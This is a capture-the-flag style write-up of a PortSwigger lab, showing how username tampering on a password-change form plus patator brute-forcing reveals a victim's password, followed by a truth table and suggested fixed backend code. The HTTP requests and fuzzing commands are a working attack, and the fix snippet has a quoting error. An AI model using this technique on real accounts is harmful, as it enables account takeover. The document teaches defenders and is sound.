# [Lab 14: Password brute-force via password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)

## Description

This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.

-   Your credentials: `wiener:peter`
-   Victim's username: `carlos`
-   [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

---

## Solution

Login to the web application with the credentials `wiener:peter` and navigate to the change password form. It contains a current password field and two new password fields.

![](images/Pasted%20image%2020210814192303.png)

Change the password to `peter1` and intercept the request.

```http
POST /my-account/change-password HTTP/1.1
Host: ac5e1f721e2e0a2a80728a6c00580058.web-security-academy.net
Cookie: session=2zS40zZTyXJnbXloqvrwVN4rEZCbrurH
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: https://ac5e1f721e2e0a2a80728a6c00580058.web-security-academy.net
Dnt: 1
Referer: https://ac5e1f721e2e0a2a80728a6c00580058.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

username=wiener&current-password=peter&new-password-1=peter1&new-password-2=peter1
```

A `POST` request to `/my-account/change-password` with a `session` cookie and the `username` specified in the body, along with the passwords. A successful submission results in an HTTP 200 response containing the string `Password changed successfully!`.

It is interesting that this application receives a `username` parameter to change the password of the current user. It seems like a better implementation would be to go off the authenticated `session` cookie and change the password of the user associated with that cookie. Perhaps this feature can be abused.

Change `username` to a nonexistent username `tgihf` and resubmit the change password request.

```http
POST /my-account/change-password HTTP/1.1
Host: ac5e1f721e2e0a2a80728a6c00580058.web-security-academy.net
Cookie: session=2zS40zZTyXJnbXloqvrwVN4rEZCbrurH
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
Origin: https://ac5e1f721e2e0a2a80728a6c00580058.web-security-academy.net
Dnt: 1
Referer: https://ac5e1f721e2e0a2a80728a6c00580058.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

username=tgihf&current-password=peter&new-password-1=peter1&new-password-2=peter1
```

The response is an HTTP 200 that contains the string `Your password is incorrect. Your username is tgihf`.

![](images/Pasted%20image%2020210814193155.png)

This response seems to indicates that the backend does consider the `username` parameter. This means that it may be possible to change another user's password, including `carlos`'s.

Change `username` to `carlos` and resubmit the change password request to determine how the application responds to trying to change another existing user's password.

```http
POST /my-account/change-password HTTP/1.1
Host: ac5e1f721e2e0a2a80728a6c00580058.web-security-academy.net
Cookie: session=LGTajyzLgUI6LJk2W3rbmUs5jQ8xFWxi
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: https://ac5e1f721e2e0a2a80728a6c00580058.web-security-academy.net
Dnt: 1
Referer: https://ac5e1f721e2e0a2a80728a6c00580058.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

username=carlos&current-password=peter&new-password-1=peter1&new-password-2=peter1
```

The response is a 302 redirect back to `/login`, indicating that the unauthorized request is being rejected. However, this was with a known incorrect password. Go ahead and brute-force `carlos`'s password this way and see if any responses are different.

```bash
$ patator http_fuzz url=https://ac5e1f721e2e0a2a80728a6c00580058.web-security-academy.net/my-account/change-password method=POST header='Cookie: session=LGTajyzLgUI6LJk2W3rbmUs5jQ8xFWxi' body='username=carlos&current-password=FILE0&new-password-1=blah&new-password-2=blah' 0=passwords.txt

18:49:10 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-14 18:49 CDT                                                      
18:49:10 patator    INFO -                                                                                                                                                           
18:49:10 patator    INFO - code size:clen       time | candidate                          |   num | mesg                                                                             
18:49:10 patator    INFO - -----------------------------------------------------------------------------                                                                             
18:49:11 patator    INFO - 302  165:0          0.129 | 123456                             |     1 | HTTP/1.1 302 Found                                                               
18:49:11 patator    INFO - 302  165:0          0.129 | password                           |     2 | HTTP/1.1 302 Found                                                               
18:49:11 patator    INFO - 302  165:0          0.124 | 12345678                           |     3 | HTTP/1.1 302 Found                                                               
18:49:11 patator    INFO - 302  165:0          0.125 | qwerty                             |     4 | HTTP/1.1 302 Found                                                               
18:49:11 patator    INFO - 302  165:0          0.124 | 123456789                          |     5 | HTTP/1.1 302 Found                                                               
18:49:11 patator    INFO - 302  165:0          0.128 | 12345                              |     6 | HTTP/1.1 302 Found                                                               
18:49:11 patator    INFO - 302  165:0          0.129 | 1234567                            |     9 | HTTP/1.1 302 Found                                                               
18:49:11 patator    INFO - 302  165:0          0.145 | 1234                               |     7 | HTTP/1.1 302 Found                                                               
18:49:11 patator    INFO - 302  165:0          0.140 | 111111                             |     8 | HTTP/1.1 302 Found                                                               
18:49:11 patator    INFO - 302  165:0          0.130 | dragon                             |    10 | HTTP/1.1 302 Found                                                               
18:49:12 patator    INFO - 302  165:0          0.123 | 123123                             |    11 | HTTP/1.1 302 Found                                                               
18:49:12 patator    INFO - 302  165:0          0.126 | baseball                           |    12 | HTTP/1.1 302 Found                                                               
18:49:12 patator    INFO - 302  165:0          0.127 | abc123                             |    13 | HTTP/1.1 302 Found                                                               
18:49:12 patator    INFO - 302  165:0          0.125 | football                           |    14 | HTTP/1.1 302 Found                                                               
18:49:12 patator    INFO - 302  165:0          0.126 | monkey                             |    15 | HTTP/1.1 302 Found                                                               
18:49:12 patator    INFO - 302  165:0          0.127 | letmein                            |    16 | HTTP/1.1 302 Found                                                               
18:49:12 patator    INFO - 302  165:0          0.132 | shadow                             |    17 | HTTP/1.1 302 Found                                                               
18:49:12 patator    INFO - 302  165:0          0.133 | master                             |    18 | HTTP/1.1 302 Found
18:49:12 patator    INFO - 302  165:0          0.126 | 666666                             |    19 | HTTP/1.1 302 Found
18:49:12 patator    INFO - 302  165:0          0.125 | qwertyuiop                         |    20 | HTTP/1.1 302 Found
18:49:12 patator    INFO - 302  165:0          0.126 | 123321                             |    21 | HTTP/1.1 302 Found
18:49:12 patator    INFO - 302  165:0          0.122 | mustang                            |    22 | HTTP/1.1 302 Found
18:49:12 patator    INFO - 302  165:0          0.126 | 1234567890                         |    23 | HTTP/1.1 302 Found
18:49:12 patator    INFO - 302  165:0          0.125 | michael                            |    24 | HTTP/1.1 302 Found
18:49:12 patator    INFO - 302  165:0          0.124 | 654321                             |    25 | HTTP/1.1 302 Found
18:49:12 patator    INFO - 302  165:0          0.128 | superman                           |    26 | HTTP/1.1 302 Found
18:49:12 patator    INFO - 302  165:0          0.127 | 1qaz2wsx                           |    27 | HTTP/1.1 302 Found
18:49:12 patator    INFO - 302  165:0          0.126 | 7777777                            |    28 | HTTP/1.1 302 Found
18:49:12 patator    INFO - 302  165:0          0.128 | 121212                             |    29 | HTTP/1.1 302 Found
18:49:12 patator    INFO - 302  165:0          0.124 | 000000                             |    30 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.127 | qazwsx                             |    31 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.120 | 123qwe                             |    32 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.125 | killer                             |    33 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.125 | trustno1                           |    34 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.126 | jordan                             |    35 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.128 | jennifer                           |    36 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.129 | hunter                             |    39 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.128 | buster                             |    40 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.125 | zxcvbnm                            |    37 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.135 | asdfgh                             |    38 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.130 | soccer                             |    41 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.128 | harley                             |    42 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.132 | batman                             |    43 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.125 | andrew                             |    44 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.127 | tigger                             |    45 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.127 | sunshine                           |    46 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.124 | iloveyou                           |    47 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.121 | 2000                               |    48 | HTTP/1.1 302 Found
18:49:13 patator    INFO - 302  165:0          0.124 | charlie                            |    49 | HTTP/1.1 302 Found                                                         [0/89]
18:49:13 patator    INFO - 302  165:0          0.127 | robert                             |    50 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.130 | hockey                             |    52 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.128 | thomas                             |    51 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.130 | ranger                             |    53 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.129 | daniel                             |    54 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.127 | starwars                           |    55 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.125 | klaster                            |    56 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.126 | george                             |    58 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.126 | computer                           |    59 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.122 | michelle                           |    60 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.121 | 112233                             |    57 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.125 | jessica                            |    61 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.126 | pepper                             |    62 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.127 | 1111                               |    63 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.124 | zxcvbn                             |    64 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.130 | 555555                             |    65 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.130 | 11111111                           |    66 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.133 | 131313                             |    67 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.131 | freedom                            |    68 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.133 | 777777                             |    69 | HTTP/1.1 302 Found
18:49:14 patator    INFO - 302  165:0          0.127 | pass                               |    70 | HTTP/1.1 302 Found
18:49:15 patator    INFO - 302  165:0          0.131 | 159753                             |    72 | HTTP/1.1 302 Found
18:49:15 patator    INFO - 302  165:0          0.140 | maggie                             |    71 | HTTP/1.1 302 Found
18:49:15 patator    INFO - 302  165:0          0.142 | aaaaaa                             |    73 | HTTP/1.1 302 Found
18:49:15 patator    INFO - 302  165:0          0.133 | ginger                             |    74 | HTTP/1.1 302 Found
18:49:15 patator    INFO - 302  165:0          0.139 | princess                           |    75 | HTTP/1.1 302 Found
18:49:15 patator    INFO - 302  165:0          0.138 | joshua                             |    76 | HTTP/1.1 302 Found
18:49:15 patator    INFO - 302  165:0          0.134 | love                               |    80 | HTTP/1.1 302 Found
18:49:15 patator    INFO - 302  165:0          0.144 | cheese                             |    77 | HTTP/1.1 302 Found
18:49:15 patator    INFO - 302  165:0          0.164 | amanda                             |    78 | HTTP/1.1 302 Found
18:49:15 patator    INFO - 302  165:0          0.141 | summer                             |    79 | HTTP/1.1 302 Found
18:49:15 patator    INFO - 302  165:0          0.138 | nicole                             |    82 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.127 | ashley                             |    81 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.127 | chelsea                            |    83 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.121 | biteme                             |    84 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.126 | matthew                            |    85 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.129 | access                             |    86 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.129 | austin                             |    90 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.132 | yankees                            |    87 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.123 | 987654321                          |    88 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.126 | dallas                             |    89 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.130 | thunder                            |    91 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.128 | taylor                             |    92 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.129 | mobilemail                         |    94 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.142 | matrix                             |    93 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.146 | mom                                |    95 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.124 | monitor                            |    96 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.126 | monitoring                         |    97 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.126 | montana                            |    98 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.128 | moon                               |    99 | HTTP/1.1 302 Found
18:49:16 patator    INFO - 302  165:0          0.132 | moscow                             |   100 | HTTP/1.1 302 Found
18:49:17 patator    INFO - Hits/Done/Skip/Fail/Size: 100/100/0/0/100, Avg: 15 r/s, Time: 0h 0m 6s
```

All passwords returned 302s of the same size.

Back to the drawing board. Resubmit the change password request with the `username=wiener` and investigate the responses when other parameters aren't what the application is expecting.

A change password request with mismatching new password entries and authenticated username `wiener` results in a 200 response containing the string `New passwords do not match`. Interestingly, changing the username to both `tgihf` and `carlos` result in a 200 response containing the string `Current password is incorrect`. Perhaps it is possible to brute-force `carlos`'s password if the new passwords are mismatched.

```bash
$ patator http_fuzz url=https://aca21f8b1ea4a95380f44c960006002d.web-security-academy.net/my-account/change-password method=POST header='Cookie: session=GzKr9QxH8D8BEU3XoXPgYokiR9TfXyx4' body='username=carlos&current-password=FILE0&new-password-1=blah&new-password-2=woo' 0=passwords.txt

14:43:53 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-15 14:43 CDT                                                      
14:43:53 patator    INFO -                                                                                                                                                           
14:43:53 patator    INFO - code size:clen       time | candidate                          |   num | mesg                                                                             
14:43:53 patator    INFO - -----------------------------------------------------------------------------                                                                             
14:43:54 patator    INFO - 200  3879:3754      0.140 | 123456                             |     1 | HTTP/1.1 200 OK                                                                  
14:43:54 patator    INFO - 200  3879:3754      0.140 | password                           |     2 | HTTP/1.1 200 OK                                                                  
14:43:54 patator    INFO - 200  3879:3754      0.132 | 12345678                           |     3 | HTTP/1.1 200 OK                                                                  
14:43:54 patator    INFO - 200  3879:3754      0.130 | qwerty                             |     4 | HTTP/1.1 200 OK                                                                  
14:43:54 patator    INFO - 200  3879:3754      0.125 | 12345                              |     6 | HTTP/1.1 200 OK                                                                  
14:43:54 patator    INFO - 200  3879:3754      0.139 | 123456789                          |     5 | HTTP/1.1 200 OK                                                                  
14:43:54 patator    INFO - 200  3879:3754      0.131 | 1234                               |     7 | HTTP/1.1 200 OK                                                                  
14:43:54 patator    INFO - 200  3879:3754      0.136 | 111111                             |     8 | HTTP/1.1 200 OK                                                                  
14:43:54 patator    INFO - 200  3879:3754      0.141 | 1234567                            |     9 | HTTP/1.1 200 OK                                                                  
14:43:54 patator    INFO - 200  3879:3754      0.136 | dragon                             |    10 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.128 | 123123                             |    11 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.133 | baseball                           |    12 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.125 | abc123                             |    13 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.130 | football                           |    14 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.128 | monkey                             |    15 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.129 | letmein                            |    16 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.165 | shadow                             |    17 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.184 | master                             |    18 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.168 | 666666                             |    19 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.157 | qwertyuiop                         |    20 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.132 | 123321                             |    21 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.124 | mustang                            |    22 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.129 | michael                            |    24 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.134 | 1234567890                         |    23 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.132 | 654321                             |    25 | HTTP/1.1 200 OK                                                                  
14:43:55 patator    INFO - 200  3879:3754      0.127 | superman                           |    26 | HTTP/1.1 200 OK
14:43:55 patator    INFO - 200  3879:3754      0.125 | 1qaz2wsx                           |    27 | HTTP/1.1 200 OK
14:43:55 patator    INFO - 200  3879:3754      0.127 | 000000                             |    30 | HTTP/1.1 200 OK
14:43:55 patator    INFO - 200  3879:3754      0.129 | 7777777                            |    28 | HTTP/1.1 200 OK
14:43:55 patator    INFO - 200  3879:3754      0.131 | 121212                             |    29 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.128 | qazwsx                             |    31 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.130 | 123qwe                             |    32 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.129 | trustno1                           |    34 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.134 | jordan                             |    35 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.137 | jennifer                           |    36 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.137 | killer                             |    33 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.131 | zxcvbnm                            |    37 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.131 | buster                             |    40 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.128 | asdfgh                             |    38 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.126 | hunter                             |    39 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.123 | soccer                             |    41 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.127 | harley                             |    42 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.124 | andrew                             |    44 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.129 | batman                             |    43 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.139 | tigger                             |    45 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.135 | sunshine                           |    46 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.146 | iloveyou                           |    47 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.128 | 2000                               |    48 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.129 | charlie                            |    49 | HTTP/1.1 200 OK
14:43:56 patator    INFO - 200  3879:3754      0.171 | robert                             |    50 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.126 | thomas                             |    51 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.129 | hockey                             |    52 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.136 | daniel                             |    54 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.121 | ranger                             |    53 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.132 | starwars                           |    55 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.136 | klaster                            |    56 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.127 | 112233                             |    57 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.145 | george                             |    58 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.134 | computer                           |    59 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.144 | michelle                           |    60 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.137 | jessica                            |    61 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.137 | pepper                             |    62 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.139 | 1111                               |    63 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.131 | zxcvbn                             |    64 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.131 | 555555                             |    65 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.145 | 11111111                           |    66 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.145 | 131313                             |    67 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.131 | 777777                             |    69 | HTTP/1.1 200 OK
14:43:57 patator    INFO - 200  3879:3754      0.139 | pass                               |    70 | HTTP/1.1 200 OK
14:43:58 patator    INFO - 200  3879:3754      0.128 | freedom                            |    68 | HTTP/1.1 200 OK
14:43:58 patator    INFO - 200  3879:3754      0.133 | maggie                             |    71 | HTTP/1.1 200 OK
14:43:58 patator    INFO - 200  3879:3754      0.125 | 159753                             |    72 | HTTP/1.1 200 OK
14:43:58 patator    INFO - 200  3879:3754      0.127 | ginger                             |    74 | HTTP/1.1 200 OK
14:43:58 patator    INFO - 200  3876:3751      0.128 | aaaaaa                             |    73 | HTTP/1.1 200 OK
14:43:58 patator    INFO - 200  3879:3754      0.125 | princess                           |    75 | HTTP/1.1 200 OK
14:43:58 patator    INFO - 200  3879:3754      0.125 | joshua                             |    76 | HTTP/1.1 200 OK
14:43:58 patator    INFO - 200  3879:3754      0.128 | cheese                             |    77 | HTTP/1.1 200 OK
14:43:58 patator    INFO - 200  3879:3754      0.129 | amanda                             |    78 | HTTP/1.1 200 OK
14:43:58 patator    INFO - 200  3879:3754      0.127 | summer                             |    79 | HTTP/1.1 200 OK
14:43:58 patator    INFO - 200  3879:3754      0.127 | love                               |    80 | HTTP/1.1 200 OK
14:43:58 patator    INFO - 200  3879:3754      0.135 | ashley                             |    81 | HTTP/1.1 200 OK
14:43:58 patator    INFO - 200  3879:3754      0.143 | nicole                             |    82 | HTTP/1.1 200 OK
14:43:58 patator    INFO - 200  3879:3754      0.140 | biteme                             |    84 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.131 | chelsea                            |    83 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.132 | matthew                            |    85 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.126 | access                             |    86 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.120 | yankees                            |    87 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.129 | dallas                             |    89 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.130 | 987654321                          |    88 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.133 | austin                             |    90 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.136 | thunder                            |    91 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.128 | taylor                             |    92 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.130 | matrix                             |    93 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.127 | mobilemail                         |    94 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.127 | mom                                |    95 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.126 | monitor                            |    96 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.143 | monitoring                         |    97 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.125 | moon                               |    99 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.124 | moscow                             |   100 | HTTP/1.1 200 OK
14:43:59 patator    INFO - 200  3879:3754      0.132 | montana                            |    98 | HTTP/1.1 200 OK
14:44:00 patator    INFO - Hits/Done/Skip/Fail/Size: 100/100/0/0/100, Avg: 15 r/s, Time: 0h 0m 6s
```

Note that all passwords resulted in a 200 response with a length of 3879 bytes, except for the password `aaaaaa`. The response of the request indicates that instead of `Current password is incorrect`, `New passwords do not match`.

![](images/Pasted%20image%2020210815154804.png)

This differing response indicates that `aaaaaa` could be `carlos`'s password. Login with the credentials `carlos:aaaaaa` to complete the challenge.

---

## Understanding the Backend

| session | username | current password match? | new passwords match? | outcome |
| --- | --- | --- | --- | --- |
| wiener | wiener | no | no | Current password is incorrect |
| wiener | wiener | no | yes | 302 -> `/login`, invalidates `session` |
| wiener | wiener | yes | no | New passwords do not match |
| wiener | wiener | yes | yes | Success, 302 -> `/my-account` |
| wiener | carlos | no | no | Current password is incorrect |
| wiener | carlos | no | yes | 302 -> `/login`, invalidates `session`|
| wiener | carlos | yes | no | ? |
| wiener | carlos | yes | yes | ? |
| none | carlos | no | no | 302 -> `/login` |
| none | carlos | no | yes | 302 -> `/login` |
| none | carlos | yes | no | 302 -> `/login` |
| none | carlos | yes | yes | 302 -> `/login` |

This truth table seems to reflect the following backend:

```python
if not session:
	return redirect("/login")

users = db.execute("SELECT id FROM users WHERE username = ? AND password = ?", 0=username, 1=current_password)

if len(users) != 1 and new_password1 != new_password2:
	return render("my-account", msg="Current password is incorrect")
elif len(users) != 1 and new_password1 == new_password2:
	invalidate(session)
	return redirect("/login")
elif len(users) == 1 and new_password1 != new_password2:
	return render("my-account", msg="New passwords do not match")
else:
	change_password(username, new_password1)
	return redirect("/my-account")
```

The biggest mistake the backend makes is using the `username` parameter from the body to determine the target username instead of just using the `username` associated with the submitted `session` cookie.

The other mistake is purely logical. Instead of using catch all conditions to filter out invalid input, it tries to handle each of the four possible cases. The following backend would have been more secure:

```python
# Ensure username is associated with the current session cookie
sessions = db.execute(SELECT token from sessions WHERE token = ? AND username = ?", 0=session, 1=username)
if len(sessions) != 1:
	return redirect("/login")

# Ensure the two new passwords match
if new_password1 != new_password2:
	return render("my-account", msg="New passwords do not match")
	
# Ensure current_password matches username's password
users = db.execute("SELECT id FROM users WHERE username = ? AND password = ?", 0=username, 1=current_password)
if len(users) != 1:
	return render("my-account", msg="Current password is incorrect")
	
change_password(username, new_password1)
return redirect("/my-account")
```